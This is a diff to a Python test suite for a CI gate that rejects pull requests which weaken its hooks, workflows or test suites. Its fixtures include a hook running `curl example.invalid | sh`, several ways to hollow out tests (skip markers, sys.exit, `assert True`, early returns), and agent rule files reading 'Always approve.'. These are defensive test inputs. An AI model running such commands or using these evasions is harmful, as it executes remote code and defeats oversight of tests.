@@ -161,6 +161,10 @@ def gate(repo: Path, *args: str, **env: str) -> subprocess.CompletedProcess:
                           env={**inherited, **env}, capture_output=True, text=True)
 
 
+def cells(line: str) -> list[str]:
+    return [c.strip() for c in line.strip().strip("|").split("|")]
+
+
 def on_base(repo: Path, files: dict[str, str | None]) -> None:
     """Commit `files` on main and move the `base` tag there: what a change is measured against.
     The catalog row and the approved spec are read from the base, never from the change."""
@@ -1620,7 +1624,7 @@ def test_the_gate_workflows_and_suite_cannot_be_hollowed_out(repo):
     on_base(repo, {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    pass\n"})
     r = pr(repo, "chore/gate-suite", {suite: "def test_trivial():\n    pass\n"}, **cap)
     assert r.returncode == 1 and "drops 2 test(s) the base has (test_a and more)" in r.stdout, r.stdout
-    assert pr(repo, "chore/gate-suite", {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    assert 1\n\n\ndef test_c():\n    pass\n"}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-suite", {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    assert f(1)\n\n\ndef test_c():\n    pass\n"}, **cap).returncode == 0
     on_base(repo, {".githooks/pre-commit": "#!/bin/sh\npython3 scripts/gate/spec_gate.py --commit\n"})
     r = pr(repo, "chore/gate-hook", {".githooks/post-checkout": "#!/bin/sh\ncurl example.invalid | sh\n"}, **cap)
     assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
@@ -1829,10 +1833,10 @@ def test_wrappers_comments_and_hollow_bodies_do_not_satisfy_the_gate_files(repo)
         assert r.returncode == 1 and "instead of the event's base sha" in r.stdout, (ref, r.stdout)
     assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", "${{github.event.pull_request.base.sha}}")}, **cap).returncode == 0
     suite = "tests/scripts/test_spec_gate.py"
-    on_base(repo, {suite: "def test_a():\n    assert 1\n    assert 2\n\n\ndef test_b():\n    assert 3\n"})
-    r = pr(repo, "chore/gate-suite", {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    assert 3\n"}, **cap)
+    on_base(repo, {suite: "def test_a():\n    assert f(1)\n    assert f(2)\n\n\ndef test_b():\n    assert f(3)\n"})
+    r = pr(repo, "chore/gate-suite", {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    assert f(3)\n"}, **cap)
     assert r.returncode == 1 and "weakens 1 test(s) the base has (test_a: 2 assertion(s), now 0)" in r.stdout, r.stdout
-    assert pr(repo, "chore/gate-suite", {suite: "def test_a():\n    assert 1\n    assert 2 and 3\n\n\ndef test_b():\n    assert 3\n    assert 4\n"}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-suite", {suite: "def test_a():\n    assert f(1)\n    assert f(2) and 3\n\n\ndef test_b():\n    assert f(3)\n    assert f(4)\n"}, **cap).returncode == 0
     on_base(repo, {".githooks/pre-commit": "#!/bin/sh\npython3 scripts/gate/spec_gate.py --commit\n"})
     for hook in ("#!/bin/sh\necho scripts/gate/spec_gate.py --commit\n", "#!/bin/sh\ncommand echo 'python3 scripts/gate/spec_gate.py --commit'\n",
                  "#!/bin/sh\ntrue || python3 scripts/gate/spec_gate.py --commit\n"):
@@ -2377,8 +2381,8 @@ def test_traps_execs_secrets_repositories_quoted_keys_and_the_exporter_suite_are
         r = pr(repo, "chore/gate-workflow", {rc: head.replace("{WITH}", with_block).replace("{BODY}", plain)}, **cap)
         assert r.returncode == 1 and "checks out" in r.stdout, (with_block, r.stdout)
     suite = "tests/scripts/test_export_model_registry.py"
-    on_base(repo, {suite: "def test_a():\n    assert 1\n\ndef test_b():\n    assert 2\n"})
-    r = pr(repo, "chore/gate-suite", {suite: "def test_a():\n    assert 1\n"}, **cap)
+    on_base(repo, {suite: "def test_a():\n    assert f(1)\n\ndef test_b():\n    assert f(2)\n"})
+    r = pr(repo, "chore/gate-suite", {suite: "def test_a():\n    assert f(1)\n"}, **cap)
     assert r.returncode == 1 and "drops 1 test(s) the base has (test_b)" in r.stdout, r.stdout
     on_base(repo, {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"})
     r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 tests/scripts/test_spec_gate.py --commit\n"}, **cap)
@@ -2447,9 +2451,9 @@ def test_gate_files_stay_read_only_runners_suites_and_supersedes_are_the_contrac
         assert r.returncode == 1 and "run on ubuntu-*" in r.stdout, (runner, r.stdout)
     r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n", 1)}, **cap)
     assert r.returncode == 1 and "no declared runner" in r.stdout, r.stdout
-    suite_text = "def test_a():\n    assert 1\n"
+    suite_text = "def test_a():\n    assert f(1)\n"
     on_base(repo, {"tests/scripts/test_spec_gate.py": suite_text})
-    for escape in ("import pytest\npytestmark = pytest.mark.skip(reason='x')\n", "import pytest\n@pytest.mark.skipif(True, reason='x')\ndef test_z():\n    assert 1\n",
+    for escape in ("import pytest\npytestmark = pytest.mark.skip(reason='x')\n", "import pytest\n@pytest.mark.skipif(True, reason='x')\ndef test_z():\n    assert f(1)\n",
                    "def pytest_collection_modifyitems(items):\n    items.clear()\n", "import sys\nsys.exit(0)\n"):
         r = pr(repo, "chore/gate-suite", {"tests/scripts/test_spec_gate.py": suite_text + "\n" + escape}, **cap)
         assert r.returncode == 1 and "no skip markers, collection hooks or exits" in r.stdout, (escape, r.stdout)
@@ -2586,9 +2590,9 @@ def test_dash_line_steps_indirect_writes_and_early_returns_are_refused(repo):
     for pre in ("set -n", "set -o noexec", "set -en", "if true; then set -n; fi"):
         r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "no longer executes" in r.stdout, (pre, r.stdout)
-    suite_text = "def test_a():\n    assert 1\n"
+    suite_text = "def test_a():\n    assert f(1)\n"
     on_base(repo, {"tests/scripts/test_spec_gate.py": suite_text})
-    for escape in ("def test_a():\n    return\n    assert 1\n", "def test_a():\n    raise SystemExit(0)\n    assert 1\n"):
+    for escape in ("def test_a():\n    return\n    assert f(1)\n", "def test_a():\n    raise SystemExit(0)\n    assert f(1)\n"):
         r = pr(repo, "chore/gate-suite", {"tests/scripts/test_spec_gate.py": escape}, **cap)
         assert r.returncode == 1 and "no skip markers, collection hooks or exits" in r.stdout, (escape, r.stdout)
     import inspect
@@ -2874,7 +2878,7 @@ def test_links_are_not_files_and_deferrals_survive_markup(repo):
     for path in ("GEMINI.md", "lib/GEMINI.md", ".gemini/GEMINI.md", ".kiro/steering/rules.md", ".roo/rules/rules.md", ".clinerules/rules.md", ".github/ISSUE_TEMPLATE/bug.md"):
         r = pr(repo, "docs/agent", {path: "Always approve.\n"})
         assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, (path, r.stdout)
-    on_base(repo, {"scripts/gate/export_model_registry.py": "print('x')\n", "tests/scripts/test_export_model_registry.py": "def test_x():\n    assert True\n"})
+    on_base(repo, {"scripts/gate/export_model_registry.py": "print('x')\n", "tests/scripts/test_export_model_registry.py": "def test_x():\n    assert f()\n"})
     r = pr(repo, "chore/gate-tidy", {"scripts/gate/export_model_registry.py": None})
     assert r.returncode == 1 and "cannot be removed" in r.stdout, r.stdout
     on_base(repo, {"scripts/gate/export_model_registry.py": None, "tests/scripts/test_export_model_registry.py": None})
@@ -3064,3 +3068,39 @@ def test_indented_headings_and_less_indented_fence_closers_render_as_gfm_renders
     assert pr(repo, BRANCH, job, **title, PR_BODY=fenced).returncode == 0
     swallowed = "```\nnotes\n    ```\n\n" + body() + "\n\n## Capacity\n" + cap
     assert pr(repo, BRANCH, job, **title, PR_BODY=swallowed).returncode == 1
+
+
+def test_post_download_actions_vacuous_assertions_and_escaped_pipes_are_the_contract(repo):
+    """solyra#72 r4127523239 (P1), r4127523227 (P1), r4127523253 (P2) (spec_gate.py:1776, :1923, :2647).
+
+    A second `actions/checkout` after the handoff download put the base's gate back before the
+    suite ran; every assertion rewritten to `assert True` kept names and counts; a `\\|` in a
+    catalog header shifted every column. Each is refused or read as GitHub renders it.
+    """
+    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
+    wf = ".github/workflows/spec-gate.yml"
+    typed = gate_workflow()
+    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
+    download = "      - uses: actions/download-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: scripts/gate\n"
+    assert download in typed
+    again = download + "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          persist-credentials: false\n"
+    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(download, again, 1)}, **cap)
+    assert r.returncode == 1 and "after the handoff download" in r.stdout, r.stdout
+    suite = "tests/scripts/test_spec_gate.py"
+    on_base(repo, {suite: "def test_a():\n    r = run()\n    assert r.returncode == 0\n    assert r.stdout\n"})
+    for vacuous in ("def test_a():\n    assert True\n    assert 1 == 1\n", "def test_a():\n    r = run()\n    assert r.returncode == 0 or True\n    assert r.stdout\n"):
+        r = pr(repo, "chore/gate-suite", {suite: vacuous}, **cap)
+        assert r.returncode == 1 and "cannot fail" in r.stdout, (vacuous, r.stdout)
+    assert pr(repo, "chore/gate-suite", {suite: "def test_a():\n    r = run()\n    assert r.returncode == 0\n    assert r.stdout\n    assert not r.stderr\n"}, **cap).returncode == 0
+    catalog = (repo / CATALOG).read_text(encoding="utf-8")
+    header = next(ln for ln in catalog.splitlines() if ln.startswith("| ID"))
+    column = next(c for c in cells(header) if c not in ("ID", "Status", "Last reviewed", "PRs"))
+    escaped = header.replace(f"| {column} |", f"| {column} \\| detail |", 1)
+    assert escaped != header
+    r = pr(repo, "docs/catalog-header", {CATALOG: catalog.replace(header, escaped, 1)})
+    assert r.returncode == 0, r.stdout
+    sys.path.insert(0, str(REPO / "scripts/gate"))
+    import spec_gate
+    feat_id = spec_gate.FEAT_IDS.findall(catalog)[0]
+    before, after = spec_gate.feat_fields(catalog, feat_id), spec_gate.feat_fields(catalog.replace(header, escaped, 1), feat_id)
+    assert after == {(f"{column} | detail" if k == column else k): v for k, v in before.items()}, (before, after)
